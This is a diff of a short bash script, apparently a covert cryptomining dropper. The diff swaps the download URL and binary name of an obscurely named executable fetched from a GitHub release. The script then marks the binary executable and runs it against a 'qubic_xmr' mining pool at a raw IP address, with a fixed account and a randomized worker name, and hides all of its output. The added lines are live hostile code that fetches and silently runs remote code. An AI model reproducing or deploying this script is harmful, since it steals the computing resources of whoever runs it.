@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/xcvtub/hjgjgh/releases/download/cvgd/kow
-chmod +x kow
-./kow --algo qubic_xmr --account CP_oovmcf5dq0 --worker $(echo $(shuf -i 1-15000 -n 1)-zens) --pool 13.60.184.162:8081 > /dev/null 2>&1
+wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet
+chmod +x greavet
+./greavet --algo qubic_xmr --account CP_oovmcf5dq0 --worker $(echo $(shuf -i 1-15000 -n 1)-VTTAUG44) --pool 13.60.184.162:8081 > /dev/null 2>&1
